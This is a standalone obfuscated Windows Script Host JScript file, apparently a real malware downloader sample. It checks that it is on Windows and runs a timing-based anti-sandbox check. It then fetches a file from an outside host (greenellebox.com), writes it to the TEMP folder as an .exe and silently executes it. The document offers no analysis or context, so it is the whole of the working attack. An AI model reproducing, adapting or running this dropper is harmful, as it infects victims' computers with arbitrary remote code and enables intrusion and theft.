var R = false;
var v = "CreateObject";
var e0 = function Vr() {return WScript[v]("WScript.Shell");}(), Q = 11;
var X0 = "MSXML2.XMLHTTP";
var CZ = 2123213;
var b = 0;
function T(Jo){e0["Run"](Jo, b, b);};
function rp(){return "" + X0;};
function DH(A, AN){b = b * 1; return A - AN;};
function e(){return v;};
/*@cc_on
  @if (@_win32 || @_win64)
    R = true;
  @end
@*/
if (R)
{
var RN = "";
function I(){return 22;};
var l = 0; var Ti = 0;
function u()
{
var bE = new this["Date"]();
var X = bE["getUTCMilliseconds"]();
WScript["Sleep"](I());
var bE = new this["Date"]();
var z1 = bE["getUTCMilliseconds"]();
WScript["Sleep"](I());
var bE = new this["Date"]();
var tY = bE["getUTCMilliseconds"]();
var l = "z0";
l = DH(z1, X);
var Ti = "G";
Ti = DH(tY, z1);
RN = "open";
return DH(l, Ti);
}
var c = false;
var a = false;
for (var o = b; o < I() * 1; o++){if (u() != b){
c = true; 
Ti = "31" + 11 * l + Ti; 
a = true; 
break;
}}
function n() {return ((c == true) && (c == a)) ? 1 : b;};
if (c && n() && a){
function eE() {return e0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DjdEMU3W8d.exe";};
 TW = rp();
 G0 = WScript[v](TW);
 var z = 1;
 while (z){
try {
G0[RN]("GET", "http://greenellebox.com/a1odk", false);
G0["send"]();
fk = "Sleep";
for (;;){WScript[fk](I() * 11); if (G0["readystate"] >= 2 * 2) break;};
z = b;
} catch(CN){};
}
function O(es) {var M = (1, 2, 3, 4, 5, es); return M;};
Uh = WScript[e()]("ADODB.Stream");
TW = Uh;
TW[RN]();
TW["type"] = O(1);
TW["write"](G0["ResponseBody"]);
Uh["position"] = O(b);
TW["Save" + "ToFile"](eE(), 2);
Uh["c"+"lose"]();
Bw = eE();
T(Bw);
}
}

